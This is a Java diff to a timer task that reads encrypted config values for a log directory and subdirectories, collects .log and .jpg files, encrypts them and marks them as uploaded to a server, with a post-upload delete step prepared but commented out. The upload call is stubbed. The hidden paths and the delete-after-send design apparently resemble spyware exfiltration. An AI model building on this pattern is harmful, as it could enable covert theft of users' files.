@@ -43,8 +43,7 @@ import ru.maxeltr.rstpldr.Main;
  */
 public class SendFilesTask extends TimerTask {
 
-    private File logDir;
-
+//    private File logDir;
     private final RestUploadService uploadService;
 
     private final CryptService cryptService;
@@ -59,21 +58,29 @@ public class SendFilesTask extends TimerTask {
         this.config = config;
     }
 
-    public void setLogDir(String dir) {
-        if (dir.isEmpty()) {
-            throw new IllegalArgumentException("LogDir cannot be empty.");
-        }
-        this.logDir = new File(dir);
-    }
-
+//    public void setLogDir(String dir) {
+//        if (dir.isEmpty()) {
+//            throw new IllegalArgumentException("LogDir cannot be empty.");
+//        }
+//        this.logDir = new File(dir);
+//    }
     @Override
     public void run() {
-        ArrayList<File> files = this.listFiles();
+        String logDir = new String(this.cryptService.decrypt(this.config.getProperty("LogDir", "")));
+        ArrayList<File> files = this.listFiles(new File(logDir));
+
+        String[] subDirs = new String(cryptService.decrypt(config.getProperty("SubDirs", ""))).split(" ");
+        for (String subDir : subDirs) {
+            files.addAll(this.listFiles(new File(logDir + File.separator + subDir)));
+        }
+
         if (files.isEmpty()) {
             logger.log(Level.INFO, String.format("There is no files to sent.%n"));
 
             return;
         }
+
+
 
 //        String token = this.uploadService.authenticate();
         String token = "1";
@@ -83,6 +90,24 @@ public class SendFilesTask extends TimerTask {
             return;
         }
 
+        ArrayList<File> postedFiles = this.sendFiles(files);
+//        this.deleteFiles(postedFiles);
+    }
+
+    private void deleteFiles(ArrayList<File> files) {
+        files.forEach((file) -> {
+            boolean isDel = file.delete();
+            if (isDel == true) {
+                logger.log(Level.INFO, String.format("%s was deleted.%n", file.getName()));
+            } else {
+                logger.log(Level.SEVERE, String.format("%s was not deleted.%n", file.getName()));
+            }
+        });
+
+    }
+
+    private ArrayList<File> sendFiles(ArrayList<File> files) {
+        ArrayList<File> postedFiles = new ArrayList();
         files.forEach((file) -> {
             String encryptData = this.cryptService.encrypt(this.readBytes(file), new String(cryptService.decrypt(config.getProperty("Key2", ""))).toCharArray());
             if (encryptData.isEmpty()) {
@@ -90,28 +115,20 @@ public class SendFilesTask extends TimerTask {
 
                 return;
             }
-//            try (FileWriter out = new FileWriter(file);) {    //add del
-//                out.write(encryptData);
-//            } catch (IOException ex) {
-//                logger.log(Level.INFO, String.format("There is no access to %s.%n", file.getName()));
-//            }
 
 //            boolean result = this.uploadService.uploadFile(file.getName(), encryptData, "upload from rstPldr");
             boolean result = true;
             if (result == true) {
                 logger.log(Level.INFO, String.format("%s was sent to server.%n", file.getName()));
                 System.out.println(String.format("%s was sent to server.%n", file.getName()));
-//                boolean isDel = file.delete();
-//                if (isDel == true) {
-//                    logger.log(Level.INFO, String.format("%s was deleted.%n", file.getName()));
-//                } else {
-//                    logger.log(Level.SEVERE, String.format("%s was not deleted.%n", file.getName()));
-//                }
+                postedFiles.add(file);
             } else {
                 logger.log(Level.INFO, String.format("%s was not sent to server.%n", file.getName()));
                 System.out.println(String.format("%s was not sent to server.%n", file.getName()));
             }
         });
+
+        return postedFiles;
     }
 
     private byte[] readBytes(File file) {
@@ -127,9 +144,9 @@ public class SendFilesTask extends TimerTask {
         return data;
     }
 
-    private ArrayList<File> listFiles() {
+    private ArrayList<File> listFiles(File logDir) {
         ArrayList<File> filesForPost = new ArrayList();
-        File[] files = this.logDir.listFiles((File dir, String name1) -> name1.toLowerCase().endsWith(".log") || name1.toLowerCase().endsWith(".jpg"));
+        File[] files = logDir.listFiles((File dir, String name1) -> name1.toLowerCase().endsWith(".log") || name1.toLowerCase().endsWith(".jpg"));
         if (files != null) {
             for (File file : files) {
                 try (FileOutputStream out = new FileOutputStream(file, true);) {
